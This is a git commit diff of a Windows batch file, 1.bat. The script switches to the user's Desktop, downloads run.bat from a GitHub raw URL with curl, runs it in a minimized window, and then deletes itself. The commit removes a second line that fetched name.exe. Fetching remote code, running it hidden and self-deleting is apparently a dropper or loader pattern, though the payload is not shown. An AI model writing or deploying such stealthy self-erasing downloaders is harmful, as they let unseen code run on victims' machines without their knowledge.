510dc16a6f3c842f965df24e652e797c8d7bce8d
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-06-14 00:15:05 -0600

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,6 +1,5 @@
 cd %USERPROFILE%\Desktop
 curl -o run.bat https://raw.githubusercontent.com/oogabooga245/-/main/run.bat
-curl -o name.exe https://raw.githubusercontent.com/oogabooga245/-/main/name.exe
 START /MIN CMD.EXE /C run.bat
 del 1.bat
 exit
